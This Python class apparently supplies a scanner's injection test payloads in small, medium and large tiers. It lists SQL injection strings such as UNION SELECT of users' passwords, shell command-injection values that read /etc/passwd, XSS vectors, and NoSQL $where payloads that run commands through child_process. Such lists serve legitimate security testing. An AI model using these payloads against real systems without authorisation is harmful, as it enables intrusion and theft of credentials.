class InjectionPayloads:
    PAYLOADS = {
        "small": {
            "sql": [
                "'",
                "\"",
                "'; --",
                "\"; --",
                "' OR '1'='1",
                "\" OR \"1\"=\"1"
            ],
            "command": [
                ";id",
                "|id",
                "`id`",
                "$(id)"
            ],
            "xss": [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>"
            ],
            "nosql": []
        },
        "medium": {
            "sql": [
                "'",
                "\"",
                "'; --",
                "\"; --",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' UNION SELECT null,username,password FROM users--",
                "\" UNION SELECT null,username,password FROM users--",
                "1 AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
                "1; WAITFOR DELAY '0:0:5'--"
            ],
            "command": [
                ";id",
                "|id",
                "`id`",
                "$(id)",
                "||id",
                "&&id",
                "; sleep 5",
                "| sleep 5",
                "`sleep 5`",
                "$(sleep 5)"
            ],
            "xss": [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "</script><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
            ],
            "nosql": [
                '{"$where": "1 == 1"}',
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$ne": -1}',
                '{"$ne": ""}'
            ]
        },
        "large": {
            "sql": [
                "'",
                "\"",
                "'; --",
                "\"; --",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' UNION SELECT null,username,password FROM users--",
                "\" UNION SELECT null,username,password FROM users--",
                "1 AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
                "1; WAITFOR DELAY '0:0:5'--",
                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))abc)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))abc) AND '1'='1",
                "1\" AND (SELECT * FROM (SELECT(SLEEP(5)))abc) AND \"1\"=\"1",
                "1' ORDER BY 1--",
                "1' ORDER BY 10--",
                "1' GROUP BY 1--",
                "1' GROUP BY 10--",
                "1' HAVING 1=1--",
                "1' HAVING 1=0--"
            ],
            "command": [
                ";id",
                "|id",
                "`id`",
                "$(id)",
                "||id",
                "&&id",
                "; sleep 5",
                "| sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "; whoami",
                "| whoami",
                "`whoami`",
                "$(whoami)",
                "; uname -a",
                "| uname -a",
                "`uname -a`",
                "$(uname -a)"
            ],
            "xss": [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "</script><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                "<body onload=alert(1)>",
                "<iframe src=\"javascript:alert(1)\">",
                "<object data=\"javascript:alert(1)\">",
                "<embed src=\"javascript:alert(1)\">",
                "<a href=\"javascript:alert(1)\">click</a>",
                "<form action=\"javascript:alert(1)\"><input type=submit>",
                "<isindex action=\"javascript:alert(1)\" type=image>",
                "<math><brute href=\"javascript:alert(1)\">click</brute></math>"
            ],
            "nosql": [
                '{"$where": "1 == 1"}',
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$ne": -1}',
                '{"$ne": ""}',
                '{"$where": "sleep(5000)"}',
                '{"$where": "sleep(5000) || \'a\'==\'a\'"}',
                '{"$where": "this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'id\')"}',
                '{"$where": "this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'cat /etc/passwd\')"}',
                '{"$where": "this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'whoami\')"}'
            ]
        }
    }

    @classmethod
    def get_payloads(cls, size="medium"):
        """Get payloads for the specified size"""
        return cls.PAYLOADS.get(size.lower(), cls.PAYLOADS["medium"])